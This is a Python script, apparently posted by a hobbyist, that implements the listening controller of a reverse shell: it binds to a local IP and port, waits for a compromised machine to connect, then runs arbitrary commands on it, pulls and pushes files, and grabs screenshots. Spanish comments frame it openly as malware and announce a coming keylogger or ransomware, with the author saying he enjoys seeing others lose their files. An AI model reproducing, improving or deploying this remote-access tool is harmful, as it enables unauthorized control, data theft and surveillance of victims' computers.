# Create by Al3jandr0M4p

# I'm XMR8
# ningun sistema es seguro jajaj tu imaginacion es el limite

# apoyame cabro que aqui estamos para ayudarnos entre programadores
# que estoy por subir un keylogger funcional o un ransomware nose me gusta ver a los demas
# fustrados por perder sus archivos esto de malware ya se ha vuelto una adiccion

import socket
import signal
import sys
import base64

from colorama import Fore, Style, init

init()

def def_handler(signum, frame):
    global s
    print(f'\n\n{Fore.RED}{Style.BRIGHT}Saliendo...{Style.RESET_ALL}\n')
    if s:
        s.close()
    sys.exit(1)


def shell():
    current_dir = target.recv(1024).decode()
    while True:
        comando = input(f"{current_dir}~#: ").lower().strip()
        if comando in ['exit', 'salir']:
            target.send(comando.encode())
            signal.raise_signal(signal.SIGINT)
        elif comando[:2] == "cd":
            target.send(comando.encode())
            res = target.recv(1024).decode()
            current_dir = res
        elif comando == "":
            pass
        elif comando[:8] == "download":
            target.send(comando.encode())
            with open(comando[9:], 'wb') as download:
                datos = target.recv(30000)
                download.write(base64.b64decode(datos))
        elif comando[:6] == "upload":
            try:
                target.send(comando.encode())
                with open(comando[7:], 'rb') as upload:
                    target.send(base64.b64encode(upload.read()))
            except Exception as e:
                print(f"{Fore.RED}Ocurrió un error en la subida del archivo: {e}{Style.RESET_ALL}")
        elif comando[:10] == "screenshot":
            contador = 0
            target.send(comando.encode())
            with open("captura-%d.png" % contador, 'wb') as screen:
                datos = target.recv(1000001)
                data = base64.b64decode(datos)
                if data == "error":
                    print(f"{Fore.RED}No se tomo la captura de pantalla{Style.RESET_ALL}")
                else:
                    screen.write(data)
                    print(f"{Fore.GREEN}Captura tomada con exito!{Style.RESET_ALL}")
                    contador += 1
        else:
            target.send(comando.encode())
            res = target.recv(30000)
            if res == b"1":
                continue
            else:
                print(res.decode('latin-1'))


def server():
    global s
    global contador
    global target
    global ip
    
    signal.signal(signal.SIGINT, def_handler)
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('192.168.1.110', 7777))
    s.listen(1)
    
    print(f'{Fore.GREEN}{Style.BRIGHT}[+]{Style.RESET_ALL}{Style.BRIGHT}Corriendo servidor esperando conexiones{Style.RESET_ALL}')
    
    target, ip = s.accept()
    print(f'{Style.BRIGHT}Conexión recibida de: {str(ip[0])} {Style.RESET_ALL}')
    
    print(f"""{Fore.GREEN}{Style.BRIGHT}
                 ██████╗  █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗ 
                ██╔════╝ ██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝ 
                ██║  ███╗███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗
                ██║   ██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║
                ╚██████╔╝██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝
                ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
        {Style.RESET_ALL}""")
    
    shell()

if __name__ == '__main__':
    server()